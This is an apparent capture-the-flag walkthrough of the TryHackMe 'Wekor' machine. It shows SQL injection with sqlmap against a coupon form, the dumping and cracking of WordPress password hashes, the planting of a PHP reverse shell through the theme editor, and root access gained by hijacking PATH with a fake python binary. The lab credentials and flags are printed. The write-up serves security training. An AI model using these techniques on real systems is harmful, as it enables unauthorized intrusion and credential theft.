---
title: 'Wekor — THM WriteUp'
date: 'Nov 20, 2023'
description: 'CTF challenge involving Sqli , WordPress , vhost enumeration and recognizing internal services ;)'
category: 'Walkthrough'
cover: 'https://i.postimg.cc/G2byhmLK/0-50VGXi-Kw-XX6fc-GK8.webp'
tags: [ 'Wekor', 'Thm', 'Pentesting', 'Writeup', 'Tryhackme Walkthrough' ]
---

## Task 1: Introduction

Hey Everyone! This Box is just a little CTF I’ve prepared recently. I hope you enjoy it as it is my first time ever creating something like this !

This CTF is focused primarily on enumeration, better understanding of services and thinking out of the box for some parts of this machine.

Feel free to ask any questions…It’s okay to be confused in some parts of the box ;)

Just a quick note, Please use the domain : “wekor.thm” as it could be useful later on in the box ;)

```
sudo echo "10.10.129.90    wekor.thm" > /etc/hosts
```

### Q1. Deploy The Machine!

Answer: No Answer Need

---

## Task 2: Finishing Up

> Time To Submit The Flags :)

### Q2. What is the user flag?

```
$ sudo nmap -p- wekor.thm -vvv -sCV -T4
...
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:c3:ce:af:07:fa:e2:8e:29:04:e4:cd:14:6a:21:b5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDn0l/KSmAk6LfT9R73YXvsc6g8qGZvMS+A5lJ19L4G5xbhSpCoEN0kBEZZQfI80sEU7boAfD0/VcdFhURkPxDUdN1wN7a/4alpMMMKf2ey0tpnWTn9nM9JVVI9rloaiD8nIuLesjigq+eEQCaEijfArUtzAJpESwRHrtm2OWTJ+PYNt1NDIbQm1HJHPasD7Im/wW6MF04mB04UrTwhWBHV4lziH7Rk8DYOI1xxfzz7J8bIatuWaRe879XtYA0RgepMzoXKHfLXrOlWJusPtMO2x+ATN2CBEhnNzxiXq+2In/RYMu58uvPBeabSa74BthiucrdJdSwobYVIL27kCt89
|   256 4d:99:b5:68:af:bb:4e:66:ce:72:70:e6:e3:f8:96:a4 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKJLaFNlUUzaESL+JpUKy/u7jH4OX+57J/GtTCgmoGOg4Fh8mGqS8r5HAgBMg/Bq2i9OHuTMuqazw//oQtRYOhE=
|   256 0d:e5:7d:e8:1a:12:c0:dd:b7:66:5e:98:34:55:59:f6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvvZ5IaMI7DHXHlMkfmqQeKKGHVMSEYbz0bYhIqPp62
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 9 disallowed entries 
| /workshop/ /root/ /lol/ /agent/ /feed /crawler /boot 
|_/comingreallysoon /interesting
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](https://i.postimg.cc/V5P1mdwT/1-Lce-E0Gvz-ZYl-XCm-Io-ZGJw-IQ.webp)

```
ROBOTS FILE

User-agent: *
Disallow: /workshop/
Disallow: /root/
Disallow: /lol/
Disallow: /agent/
Disallow: /feed
Disallow: /crawler
Disallow: /boot
Disallow: /comingreallysoon
Disallow: /interesting
```

As in Nmap, it reported the robots.txt file, I went through all the pages until I found the following:

![](https://i.postimg.cc/Z5ZBLqNM/1-VS5r-Ol-Xf-Nc-xqw8b-Tx1Riw.webp)

![](https://i.postimg.cc/mrgP068p/1-7d2u-P7Ut-NTGqg-WU3XVcy-A.webp)

At this point, I tried to enumerate all the pages and subpages, looking for hidden files, but I found nothing. So after a while, I decided to look for forms in search of sqli, since in the tags of the machine, one came out like this: SQLi.

After more than 30 minutes, capturing the form requests with burpsuite and passing them to sqlmap, I found one that gave me a result, this is the discount code found in the shopping cart page:

This is the request I made, and what I passed to sqlmap:

![](https://i.postimg.cc/zDgyZhS2/1-Nk-I0Xuw-Ax-Gw-Rb-Z1CEJrp-A.webp)

```
POST /it-next/it_cart.php HTTP/1.1
Host: wekor.thm
Content-Length: 43
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://wekor.thm
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: es-ES,es;q=0.7
Referer: http://wekor.thm/it-next/it_cart.php
Accept-Encoding: gzip, deflate, br
Connection: close

coupon_code=pwned&apply_coupon=Apply+Coupon
```

![](https://i.postimg.cc/cJCJDtJ0/1-PEP5-Zwu-DClchu6jn3bxg-A.webp)

So to get the entire database I only had to perform this command:

```
$ sqlmap -r req --batch --dump-all > pwned.all
```

But so that you don’t take so long, the actual steps to be taken are as follows:

```
$ sqlmap -r req --dbs
...
available databases [6]:
[*] coupons
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] wordpress
```

```
$ sqlmap -r req --dump --tables wordpress
...
Database: wordpress
[12 tables]
+------------------------------------------------------+
| wp_commentmeta                                       |
| wp_comments                                          |
| wp_links                                             |
| wp_options                                           |
| wp_postmeta                                          |
| wp_posts                                             |
| wp_term_relationships                                |
| wp_term_taxonomy                                     |
| wp_termmeta                                          |
| wp_terms                                             |
| wp_usermeta                                          |
| wp_users                                             |
+------------------------------------------------------+
...
```

```
$ sqlmap -r req --batch --dump -D wordpress -T wp_users
...
Database: wordpress                                                                                                                                                                                                                          
Table: wp_users
[4 entries]
+------+---------------------------------+---------------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| ID   | user_url                        | user_pass                                   | user_email        | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key                           |
+------+---------------------------------+---------------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
| 1    | http://site.wekor.thm/wordpress | $P$BoyfR2QzhNjRNmQZpva6TuuD0EE31B.          | admin@wekor.thm   | admin      | 0           | admin        | admin         | 2021-01-21 20:33:37 | <blank>                                       |
| 5743 | http://jeffrey.com              | $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10          | jeffrey@wekor.thm | wp_jeffrey | 0           | wp jeffrey   | wp_jeffrey    | 2021-01-21 20:34:50 | 1611261290:$P$BufzJsT0fhM94swehg1bpDVTupoxPE0 |
| 5773 | http://yura.com                 | $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/          | yura@wekor.thm    | wp_yura    | 0           | wp yura      | wp_yura       | 2021-01-21 20:35:27 | <blank>                                       |
| 5873 | http://eagle.com                | $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/ (xxxxxx) | eagle@wekor.thm   | wp_eagle   | 0           | wp eagle     | wp_eagle      | 2021-01-21 20:36:11 | <blank>                                       |
+------+---------------------------------+---------------------------------------------+-------------------+------------+-------------+--------------+---------------+---------------------+-----------------------------------------------+
Press enter or click to view image in full size
```

![](https://i.postimg.cc/1z890xW8/1-f5L3e-Kn-EB8FZXo1r-Rjf-KKQ.webp)

Having already the md5 hashes, mysql, we will use hashcat to decrypt them, I only managed to decrypt 3:

```
$ hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
...
yeffrey - $P$BU8QpWD.kHZv3Vd1r52ibmO913hmj10:rockyou
eagle - $P$BpyTRbmvfcKyTrbDzaK1zSPgM7J6QY/:xxxxxx
yura - $P$B6jSC3m7WdMlLi1/NDb3OFhqv536SV/:soccer13
```

To enter the wrodpress, we will only have to look in the table of wp_users where it gave us the user_url, we modify our /etc/hosts, and we will be able to enter:

```
sudo echo "10.10.129.90    site.wekor.thm" > /etc/hosts
```

![](https://i.postimg.cc/ncTZ6Vgc/1-JKMbb8g-WEP7l-Gp-Zczug-Ecg.webp)

And now, we will test yura’s credentials in wp-login, because we don’t have the admin password, and yeffrey’s and eagle’s don’t have privileges:

> yura@wekor.thm:soccer13

![](https://i.postimg.cc/63dxzBCN/1-Rh-9CERu-I8r0p-Ujyvqoo-BA.webp)

At this point, we only have to modify with the theme editor the 404.php template and change its content to a php-reverse-shell:

![](https://i.postimg.cc/qqwVVQmm/1-fx1ZRzsf-Eu7Axr4gp-Pb-Mkg.webp)

In this way, we would get the shell:

![](https://i.postimg.cc/L8ndwtjT/1-Cw-Qzspqmiz2pw-M7ESTa-QEA.webp)

Enumerating with LinEnum we find that a service called Memcached is running which we can enumerate by connecting through the telnet service:

```
telnet localhost 11211
stats items
...
END
stats cachedump 1 0
ITEM id [4 b; 1700509703 s]
ITEM email [14 b; 1700509703 s]
ITEM salary [8 b; 1700509703 s]
ITEM password [15 b; 1700509703 s]
ITEM username [4 b; 1700509703 s]
END
get user
...
get password
OrkAiSC00L24/7$
```

![](https://i.postimg.cc/cHTXdjSS/1-j-Svtc-Tnnj-TXu5Uk-Cw-SP-w-A.webp)

**Answer**: 1a26a6d51c0172400add0e297608dec6

---

### Q3. What is the root flag?

```
Orka@osboxes:~$ sudo -l
sudo -l
[sudo] password for Orka: OrkAiSC00L24/7$

Matching Defaults entries for Orka on osboxes:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User Orka may run the following commands on osboxes:
    (root) /home/Orka/Desktop/bitcoin
```

Reading the binary from /home/Orka/Desktop/bitcoin, we see that the password is “password” and then it makes a call to python:

![](https://i.postimg.cc/4Njw4Vrm/1-Ln3ELXWl8zd9VUQv-WGispg.webp)

```
Orka@osboxes:~$ echo $PATH
echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
Orka@osboxes:~$ whereis python
whereis python
python: /usr/bin/python3.5m /usr/bin/python2.7-config /usr/bin/python2.7 /usr/bin/python3.5 /usr/bin/python3.5m-config /usr/bin/python3.5-config /usr/bin/python /usr/lib/python2.7 /usr/lib/python3.5 /etc/python2.7 /etc/python3.5 /etc/python /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python3.5m /usr/include/python2.7 /usr/include/python3.5 /usr/share/python /usr/share/man/man1/python.1.gz
Orka@osboxes:~$ 
```

What we will do next, is to create our own python binary with the following content, I did it creating it in my pc, and passing it with wget to the path: /usr/sbin, this is the content:

```
#!/bin/bash
/bin/bash
```

Then, we give it execution permissions and execute the following command:

```
Orka@osboxes:/usr/sbin$ sudo /home/Orka/Desktop/bitcoin
sudo /home/Orka/Desktop/bitcoin
Enter the password : password
password
Access Granted...
   User Manual:   
Maximum Amount Of BitCoins Possible To Transfer at a time : 9 
Amounts with more than one number will be stripped off! 
And Lastly, be careful, everything is logged :) 
Amount Of BitCoins : 0
0
root@osboxes:/usr/sbin#
```

![](https://i.postimg.cc/KjkLCscJ/1-rz-Uqv-Urz-OI-9b-BUh-Bb-Cv-WA.webp)

**Answer**: f4e788f87cc3afaecbaf0f0fe9ae6ad7

<3 Carlos